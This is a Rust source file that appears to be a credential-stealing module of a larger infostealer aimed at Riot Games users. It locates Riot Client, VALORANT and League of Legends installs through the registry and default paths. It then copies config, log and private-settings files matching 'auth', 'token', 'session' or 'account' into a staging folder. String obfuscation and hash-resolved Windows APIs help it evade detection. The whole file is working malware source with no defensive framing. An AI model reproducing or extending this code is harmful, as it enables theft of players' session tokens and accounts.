use crate::sprotect;
use crate::api_resolve::HashedAPIs;
use std::path::PathBuf;
use std::fs;
use winapi::um::winreg::{HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE};
use winapi::um::winnt::KEY_READ;
use winapi::shared::minwindef::DWORD;

pub async fn extract() -> Result<(), Box<dyn std::error::Error>> {
    let output_dir = sprotect!("C:\\temp\\extract\\Games\\RiotGames");
    std::fs::create_dir_all(&output_dir)?;

    let riot_paths = detect_riot_paths().await;
    
    for riot_path in riot_paths {
        extract_riot_data(&riot_path, &output_dir).await.ok();
    }

    Ok(())
}

async fn detect_riot_paths() -> Vec<PathBuf> {
    let mut paths = Vec::new();

    if let Some(registry_path) = get_riot_registry_path().await {
        paths.push(registry_path);
    }

    let userprofile = std::env::var(sprotect!("USERPROFILE")).unwrap_or_default();
    let default_paths = vec![
        sprotect!("C:\\Riot Games"),
        sprotect!("C:\\Program Files\\Riot Games"),
        sprotect!("C:\\Program Files (x86)\\Riot Games"),
        format!("{}{}", userprofile, sprotect!("\\AppData\\Local\\Riot Games")),
        format!("{}{}", userprofile, sprotect!("\\AppData\\Roaming\\Riot Games")),
    ];

    for path_str in default_paths {
        let path = PathBuf::from(path_str);
        if path.exists() && !paths.contains(&path) {
            paths.push(path);
        }
    }

    paths
}

async fn get_riot_registry_path() -> Option<PathBuf> {
    unsafe {
        let registry_keys = vec![
            (HKEY_CURRENT_USER, sprotect!("SOFTWARE\\Riot Games")),
            (HKEY_LOCAL_MACHINE, sprotect!("SOFTWARE\\Riot Games")),
            (HKEY_CURRENT_USER, sprotect!("SOFTWARE\\Classes\\riotclient")),
            (HKEY_CURRENT_USER, sprotect!("SOFTWARE\\Classes\\valorant")),
        ];

        for (hkey, subkey) in registry_keys {
            let mut key: *mut std::ffi::c_void = std::ptr::null_mut();
            let subkey_wide: Vec<u16> = subkey.encode_utf16().chain(std::iter::once(0)).collect();

            if HashedAPIs::reg_open_key_ex_w(
                hkey as *mut _,
                subkey_wide.as_ptr(),
                0,
                KEY_READ,
                &mut key
            ) == 0 {
                let mut buffer = [0u16; 1024];
                let mut buffer_size: DWORD = (buffer.len() * 2) as DWORD;
                let value_name = sprotect!("InstallPath");
                let value_name_wide: Vec<u16> = value_name.encode_utf16().chain(std::iter::once(0)).collect();

                if HashedAPIs::reg_query_value_ex_w(
                    key,
                    value_name_wide.as_ptr(),
                    std::ptr::null_mut(),
                    std::ptr::null_mut(),
                    buffer.as_mut_ptr() as *mut u8,
                    &mut buffer_size,
                ) == 0 {
                    let len = (buffer_size / 2) as usize;
                    if len > 0 {
                        let path_string = String::from_utf16_lossy(&buffer[..len.saturating_sub(1)]);
                        HashedAPIs::reg_close_key(key);
                        return Some(PathBuf::from(path_string));
                    }
                }

                HashedAPIs::reg_close_key(key);
            }
        }
    }
    None
}

async fn extract_riot_data(riot_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    extract_riot_client(riot_path, output_dir).await?;
    extract_valorant_data(riot_path, output_dir).await?;
    extract_lol_data(riot_path, output_dir).await?;
    extract_riot_configs(riot_path, output_dir).await?;
    Ok(())
}

async fn extract_riot_client(riot_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let client_path = riot_path.join(sprotect!("Riot Client"));
    if client_path.exists() {
        let client_output = format!("{}{}", output_dir, sprotect!("\\RiotClient"));
        std::fs::create_dir_all(&client_output)?;

        let important_dirs = vec![
            sprotect!("Data"),
            sprotect!("Config"),
            sprotect!("Logs"),
        ];

        for dir_name in important_dirs {
            let dir_path = client_path.join(&dir_name);
            if dir_path.exists() {
                copy_riot_directory(&dir_path, &format!("{}\\{}", client_output, dir_name)).await?;
            }
        }
    }
    Ok(())
}

async fn extract_valorant_data(riot_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let valorant_paths = vec![
        riot_path.join(sprotect!("VALORANT")),
        PathBuf::from(format!("{}{}", std::env::var(sprotect!("USERPROFILE")).unwrap_or_default(), sprotect!("\\AppData\\Local\\VALORANT"))),
        PathBuf::from(format!("{}{}", std::env::var(sprotect!("USERPROFILE")).unwrap_or_default(), sprotect!("\\AppData\\Roaming\\VALORANT"))),
    ];

    for valorant_path in valorant_paths {
        if valorant_path.exists() {
            let valorant_output = format!("{}{}", output_dir, sprotect!("\\VALORANT"));
            std::fs::create_dir_all(&valorant_output)?;
            copy_game_files(&valorant_path, &valorant_output).await?;
        }
    }
    Ok(())
}

async fn extract_lol_data(riot_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let lol_paths = vec![
        riot_path.join(sprotect!("League of Legends")),
        PathBuf::from(format!("{}{}", std::env::var(sprotect!("USERPROFILE")).unwrap_or_default(), sprotect!("\\AppData\\Local\\Riot Games\\League of Legends"))),
        PathBuf::from(format!("{}{}", std::env::var(sprotect!("USERPROFILE")).unwrap_or_default(), sprotect!("\\AppData\\Roaming\\Riot Games\\League of Legends"))),
    ];

    for lol_path in lol_paths {
        if lol_path.exists() {
            let lol_output = format!("{}{}", output_dir, sprotect!("\\LeagueOfLegends"));
            std::fs::create_dir_all(&lol_output)?;
            copy_game_files(&lol_path, &lol_output).await?;
        }
    }
    Ok(())
}

async fn extract_riot_configs(riot_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let config_files = vec![
        sprotect!("RiotClientInstalls.json"),
        sprotect!("RiotClientPrivateSettings.yaml"),
        sprotect!("RiotClientSettings.yaml"),
    ];

    for config_file in config_files {
        let config_path = riot_path.join(&config_file);
        if config_path.exists() {
            let dest_path = format!("{}\\{}", output_dir, config_file);
            fs::copy(&config_path, dest_path).ok();
        }
    }
    Ok(())
}

async fn copy_riot_directory(src_dir: &PathBuf, dest_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    std::fs::create_dir_all(dest_dir)?;

    if let Ok(entries) = fs::read_dir(src_dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            
            if path.is_file() {
                let file_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
                if is_riot_sensitive_file(&file_name) {
                    let dest_path = format!("{}\\{}", dest_dir, file_name);
                    fs::copy(&path, dest_path).ok();
                }
            }
        }
    }
    Ok(())
}

async fn copy_game_files(src_dir: &PathBuf, dest_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    std::fs::create_dir_all(dest_dir)?;

    if let Ok(entries) = fs::read_dir(src_dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            
            if path.is_file() {
                let file_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
                if is_game_config_file(&file_name) {
                    let dest_path = format!("{}\\{}", dest_dir, file_name);
                    fs::copy(&path, dest_path).ok();
                }
            }
        }
    }
    Ok(())
}

fn is_riot_sensitive_file(filename: &str) -> bool {
    let filename_lower = filename.to_lowercase();
    let sensitive_extensions = [sprotect!(".json"), sprotect!(".yaml"), sprotect!(".yml"), sprotect!(".cfg"), sprotect!(".txt"), sprotect!(".log")];
    let sensitive_keywords = [sprotect!("config"), sprotect!("settings"), sprotect!("user"), sprotect!("account"), sprotect!("auth"), sprotect!("token"), sprotect!("session")];
    
    sensitive_extensions.iter().any(|ext| filename_lower.ends_with(ext)) &&
    sensitive_keywords.iter().any(|keyword| filename_lower.contains(keyword))
}

fn is_game_config_file(filename: &str) -> bool {
    let filename_lower = filename.to_lowercase();
    let config_extensions = [sprotect!(".json"), sprotect!(".yaml"), sprotect!(".yml"), sprotect!(".cfg"), sprotect!(".ini"), sprotect!(".txt")];
    let config_keywords = [sprotect!("config"), sprotect!("setting"), sprotect!("user"), sprotect!("account"), sprotect!("profile")];
    
    config_extensions.iter().any(|ext| filename_lower.ends_with(ext)) &&
    (config_keywords.iter().any(|keyword| filename_lower.contains(keyword)) ||
     filename_lower.contains(&sprotect!("persistedsettings")) ||
     filename_lower.contains(&sprotect!("game.cfg")))
}